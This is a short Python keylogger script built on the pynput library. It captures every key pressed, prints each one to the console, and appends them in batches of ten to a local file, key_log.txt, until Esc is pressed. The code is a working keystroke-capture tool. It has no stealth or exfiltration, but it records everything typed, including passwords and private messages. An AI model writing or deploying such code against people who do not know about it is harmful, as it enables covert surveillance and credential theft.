from os import write
import pynput
from pynput.keyboard import Key, Listener

keys = []
count = 0

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("key_log.txt", "a") as f:
        
        for key in keys:
            format_s = str(key).replace("'", "")
            
            if format_s.find("space") > 0:
                f.write("\n")
            elif format_s.find("Key") == -1:
                f.write(format_s)
            else:
                f.write(str(key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()